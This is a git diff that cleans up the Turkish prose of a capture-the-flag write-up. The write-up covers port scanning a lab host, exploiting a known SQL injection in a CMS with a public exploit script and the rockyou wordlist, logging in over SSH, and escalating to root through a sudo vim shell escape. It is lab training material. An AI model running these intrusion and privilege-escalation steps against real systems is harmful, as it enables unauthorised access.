@@ -1,4 +1,4 @@
-Öncelikle bir rustscan taraması yapıldı. rustscan kullanma amacaım nmape göre bira daha hızlı olduğu için bunu tercih ettim ve sonrasında rustscanden aldığımız sonuçları nmape aktardık detaylıca analkiz etmek için
+Öncelikle, hızlı bir port taraması yapmak için RustScan kullanıldı. RustScan’i tercih etmemin sebebi, Nmap’e kıyasla daha hızlı olmasıdır. Ardından, RustScan’den elde ettiğimiz sonuçları detaylı analiz için Nmap’e aktardık.
 
 ```bash
 rustscan -a 10.10.137.100
@@ -24,7 +24,10 @@ Open 10.10.137.100:80
 Open 10.10.137.100:2222
 
 ```
-Rustscan çıktısında 21,80 ve 2222 portunun açık olduğıu gördük ve detaylı analiz için nmapte tarama yaptık
+---
+
+RustScan çıktısında 21, 80 ve 2222 portlarının açık olduğunu tespit ettik. Daha detaylı analiz yapmak için bu portlar üzerinde Nmap ile tarama gerçekleştirdik.
+
 
 ```bash
 nmap -Pn -sV -A -p 21,80,2222 10.10.137.100
@@ -80,32 +83,45 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 42.68 seconds
 
 ```
-Nmap çıktısınıda analiz ettikten sonra robots.txt ve simple adında bir dizin görüypruz.sonrasında simple dizini içinde bir dirsearh atıyoruz ve çıktıya bakıyoruz
+---
 
-<img width="1920" height="1080" alt="dirsearch" src="https://github.com/user-attachments/assets/2c7fda46-8959-41f9-a377-06d803388253" />
+Nmap çıktısını analiz ettikten sonra, robots.txt dosyası ve simple adlı bir dizin olduğunu gördük. Daha sonra simple dizini içinde bir dizin taraması (dirsearch) yaparak sonuçları inceledik.
 
-dirsearchten aldığımz bilgilerle siteyi ziyaret ediyoruz.Login panelininde olduğunu görüo orayada bakıyoruz
+<img width="1082" height="880" alt="dirsearch" src="https://github.com/user-attachments/assets/6a89f454-2793-41f0-b58e-518047a1752d" />
 
-<img width="1920" height="1080" alt="Screenshot_2025-07-29_07_06_43" src="https://github.com/user-attachments/assets/44732bf7-7558-4cbf-9eab-d1d2ee61d3ec" />
+---
 
-<img width="1920" height="1080" alt="Screenshot_2025-07-29_07_08_28" src="https://github.com/user-attachments/assets/1587ecf3-4fe4-4dd7-9bba-9f044d9783ea" />
+Dirsearch’ten elde ettiğimiz bilgilerle siteyi ziyaret ettik. Ayrıca, bir login paneli olduğunu fark ettik ve burayı da incelemeye başladık.
 
-Sonrasında Sİmple CMS ile ilgili bir şeyler öğrnemek için googluyoruz ve bir sqli açığı olduğpunu görüyoruz.
+<img width="1679" height="793" alt="simple" src="https://github.com/user-attachments/assets/7dd2fe04-6ca9-4a73-b799-6c7e34921c79" />
 
-<img width="1920" height="1080" alt="Screenshot_2025-07-29_08_22_41" src="https://github.com/user-attachments/assets/c8b01c65-1556-47ab-8c83-0fd459278a0a" />
+<img width="1467" height="653" alt="login" src="https://github.com/user-attachments/assets/d9e9aec9-4d5f-4ae2-929b-89c9095b26bb" />
 
-Sonrasında bu exploit kullanarak sistemi sömürüyoruz
+---
+
+Sonrasında, Simple CMS hakkında bilgi edinmek için araştırma yaptık ve bu sistemde bir SQL Injection açığı olduğunu fark ettik.
+
+<img width="1561" height="847" alt="exploiitdb" src="https://github.com/user-attachments/assets/cfd735a9-adb9-43df-b697-987f6a1a9458" />
+
+---
+
+Sonrasında, bu exploit’i kullanarak sisteme erişim sağladık ve açığı başarıyla kullandık.
 
 ```bash
 python3 exploit.py -u http://<your_machine_ip>/simple --crack -w /usr/share/wordlists/rockyou.txt
 ```
-<img width="1920" height="1080" alt="Screenshot_2025-07-29_06_54_15" src="https://github.com/user-attachments/assets/d393eff7-be58-4e24-bb36-574136ef1596" />
 
-Ve bu sömürüden elde ettiğimz bilgiler ile 2222 portunda bulunan ssh servisine giriş yapıyoruz
+<img width="1335" height="625" alt="exploitpy" src="https://github.com/user-attachments/assets/855939ac-b754-4998-9ec6-a06547b1b6e0" />
 
-<img width="1920" height="1080" alt="Screenshot_2025-07-29_06_55_10" src="https://github.com/user-attachments/assets/51409875-c56e-437a-a13a-dd3961fc81ec" />
+---
 
-Sonrasında ilk flagimiz olan user.txt bulup ookuyoruz.
+Elde ettiğimiz bilgilerle 2222 portunda çalışan SSH servisine bağlandık.
+
+<img width="699" height="389" alt="sshlogin" src="https://github.com/user-attachments/assets/5df43903-c6c3-42f7-ad8b-d5739bd474a7" />
+
+---
+
+Sonrasında, ilk flag olan user.txt dosyasını bulup okuduk.
 
 ```bash
 $ ls
@@ -114,7 +130,10 @@ $ cat user.txt
 G00d xxx,xxxx xxx
 $ 
 ```
-Sonrasında sistemde başka dosya var mı diye bakıyoruz ve sunbath adında diğer dosyamızı görüyoruz bu da ctf çözümünde bize sorulan bir soruydu.
+
+---
+
+Sonrasında sistemde başka dosya olup olmadığını kontrol ettik ve sunbath adlı başka bir dosya bulduk. Bu dosya, CTF çözümünde bize sorulan sorulardan biriydi.
 
 ```bash
 # cd /home
@@ -122,7 +141,10 @@ Sonrasında sistemde başka dosya var mı diye bakıyoruz ve sunbath adında di�
 mitch  sunbath
 # 
 ```
-Sonrasında sistemde root haklarında çalıştırabildiğmiz komutları görmek için "sudo -l" komutunıu çalıştırıyoruz ve bir ayrıcalık görüyoruz.
+
+---
+
+Sonrasında, sistemde root yetkisiyle çalıştırabileceğimiz komutları görmek için "sudo -l" komutunu çalıştırdık ve bize tanımlı bir ayrıcalık olduğunu fark ettik.
 
 ```bash
 $ sudo -l
@@ -130,11 +152,17 @@ User mitch may run the following commands on Machine:
     (root) NOPASSWD: /usr/bin/vim
 $ 
 ```
-vim komutunu root haklarında çalıştırabildiğmizi görüyoruz ve hemen gtfobins wevb sayfasını ziyaret ederek neler yapabileceğimize bakıyopruz.
 
-<img width="1920" height="1080" alt="Screenshot_2025-07-29_06_57_41" src="https://github.com/user-attachments/assets/84744af3-3c84-493a-b025-ed01d3ca0905" />
+---
 
-ayrıcalık kodunu bulup çalıştırıyoruz ve root haklarına çıkmış oluyoruz ve kök bayrağımızı yakalıyoruz Ctfin sonuna geliyoruz
+vim komutunu root yetkileriyle çalıştırabildiğimizi gördük ve hemen GTFObins web sitesini ziyaret ederek bu yetkiyle neler yapabileceğimizi inceledik.
+
+<img width="1570" height="877" alt="gtfobins" src="https://github.com/user-attachments/assets/1736cc1b-f631-44fd-b7b6-ce93acf28ace" />
+
+---
+
+Tanımlı ayrıcalık komutunu bulup çalıştırıyoruz ve root yetkilerine yükseliyoruz. Böylece kök flagini elde ederek CTF’in sonuna geliyoruz.
+
 ```bash
 $ sudo vim -c ':!/bin/sh'
 ```
@@ -159,7 +187,21 @@ W3ll xxxx. xxx xxxx xxx
 # 
 ```
 
+---
 
+CTF’i başarıyla tamamladık ve hedeflediğimiz iki bayrağı da elde etmeyi başardık.
+
+---
+
+Bu CTF Bana Ne Öğretti?
+
+Bu CTF süreci benim için sadece teknik bilgileri pekiştirmekle kalmadı, aynı zamanda problem çözme ve sabırlı olma konusunda da önemli dersler verdi. Fark ettim ki, siber güvenlikte hızlı olmak kadar dikkatli ve sistematik çalışmak da çok önemli.
+
+Araçları (RustScan, Nmap, Dirsearch) etkin kullanmayı öğrenmek işimi gerçekten kolaylaştırdı ve bana pratik çözümler sunan kaynakları (GTFObins gibi) nasıl araştırıp değerlendirebileceğimi gösterdi.
+
+Ayrıca, her adımı dikkatle analiz edip öğrendiklerimi uygulamak beni bir adım daha ileri taşıdı. Bu deneyim, siber güvenlik kariyerimde ilerlemek için bana motivasyon ve özgüven verdi.
+
+CTF’ler sayesinde gerçek dünya siber saldırılarını anlamak ve bu saldırılara karşı nasıl önlem alınacağını öğrenmek benim için artık çok daha somut ve heyecan verici hale geldi.
 
 
 
